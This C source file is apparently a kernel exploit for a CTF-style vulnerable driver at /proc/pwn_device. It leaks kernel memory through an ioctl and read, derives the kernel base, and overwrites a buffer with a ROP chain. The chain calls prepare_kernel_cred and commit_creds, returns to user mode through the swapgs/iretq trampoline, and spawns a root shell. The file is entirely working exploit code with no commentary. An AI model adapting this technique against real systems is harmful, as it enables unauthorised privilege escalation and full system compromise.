#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <assert.h>
#include <string.h>

struct trap_frame{
	unsigned long rip;
	unsigned long cs;
	unsigned long rflags;
	unsigned long rsp;
	unsigned long ss;
}__attribute__((packed)) tf;

void save_state(){
	asm volatile("mov tf+8, cs;"
				 "pushf; pop tf+16;"
				 "mov tf+24, rsp;"
				 "mov tf+32, ss;"
			);
}

void show_content(unsigned long *p, int size)
{
    int i;
    
    for(i = 0; i < size; i++)
    {
        printf("Buf[%d] %lx\n", i, p[i]);
    }
}

void shell()
{
    char *args[] = {"/bin/sh", NULL};
    execve(args[0], args, NULL);
}

int main(void)
{
    int fd;
    int ret;
    unsigned long buf[0x5000/sizeof(unsigned long)];
    int i;
    
    save_state();
    fd = open("/proc/pwn_device", O_RDWR);
    printf("Vulnerable device : %d\n", fd);

    ret = ioctl(fd, 0x20, 0x5000);
    assert(ret == 0);
    
    read(fd, buf, 0x5000);
    show_content(buf, 70);
    
    unsigned long kernel_base = buf[18] - 0x23e347;
    unsigned long commit_creds = kernel_base + 0x87e80;
    unsigned long prepare_kernel_cred = kernel_base + 0x881c0;
    unsigned long swapgs_restore = kernel_base + 0xc00a2f + 0x16;
    unsigned long pop_rdi = kernel_base + 0x1518;
    unsigned long mov_rdi_rax = kernel_base + 0x01c07b;
    unsigned long pop_rcx = kernel_base + 0x86e38;
    unsigned long iretq = kernel_base + 0x23cc2;
     
    printf("Kernel base @ %lx\n", kernel_base);
    printf("pop rdi @ %lx\n", pop_rdi);
    
    getchar();
    i = 18;
    buf[i++] = pop_rdi;
    buf[i++] = 0;
    buf[i++] = prepare_kernel_cred;
    buf[i++] = pop_rcx;
    buf[i++] = 0;
    buf[i++] = mov_rdi_rax;
    buf[i++] = commit_creds;
    buf[i++] = swapgs_restore;
    buf[i++] = 0;
    buf[i++] = 0;
    buf[i++] = (unsigned long)&shell;
    buf[i++] = tf.cs;
    buf[i++] = tf.rflags;
    buf[i++] = tf.rsp;
    buf[i++] = tf.ss;

    write(fd, buf, 0x500);
}
